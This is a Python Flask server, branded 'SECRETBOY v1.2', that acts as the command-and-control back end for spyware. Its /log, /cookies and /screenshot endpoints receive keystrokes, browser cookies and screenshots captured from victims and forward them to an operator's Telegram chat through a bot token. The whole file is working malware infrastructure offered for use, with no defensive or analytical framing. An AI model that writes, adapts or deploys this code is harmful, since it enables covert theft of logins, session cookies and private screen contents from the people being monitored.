import os
import json
import base64
import telebot
from flask import Flask, request
from flask_cors import CORS

# --- CONFIG ---
TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
CHAT_ID = "YOUR_CHAT_ID_HERE"  
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)
CORS(app)

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[1;36m" + r"""
  ███████╗███████╗ ██████╗██████╗ ███████╗████████╗██████╗  ██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝
  ███████╗█████╗  ██║     ██████╔╝█████╗     ██║   ██████╔╝██║   ██║ ╚████╔╝ 
  ╚════██║██╔══╝  ██║     ██╔══██╗██╔══╝     ██║   ██╔══██╗██║   ██║  ╚██╔╝  
  ███████║███████╗╚██████╗██║  ██║███████╗   ██║   ██████╔╝╚██████╔╝   ██║   
    """ + "\033[1;31m" + "\n           [ BY N0MERC ] [ SECRETBOY v1.2 ]\033[0m")

@app.route('/log', methods=['POST'])
def handle_logs():
    data = json.loads(request.data)
    bot.send_message(CHAT_ID, f" **KEYLOG**\nURL: {data['url']}\nData: `{data['data']}`", parse_mode="Markdown")
    return "OK"

@app.route('/cookies', methods=['POST'])
def handle_cookies():
    data = json.loads(request.data)
    bot.send_message(CHAT_ID, f" **COOKIE**\nSite: {data['site']}\nData: `{data['cookies']}`", parse_mode="Markdown")
    return "OK"

@app.route('/screenshot', methods=['POST'])
def handle_screenshot():
    data = json.loads(request.data)
    img_base64 = data['image'].split(",")[1]
    with open("temp_sc.jpg", "wb") as f:
        f.write(base64.b64decode(img_base64))
    with open("temp_sc.jpg", "rb") as photo:
        bot.send_photo(CHAT_ID, photo, caption=f"📸 **SCREENSHOT**\nURL: {data['url']}", parse_mode="Markdown")
    return "OK"

if __name__ == "__main__":
    show_banner()
    app.run(host='0.0.0.0', port=5000)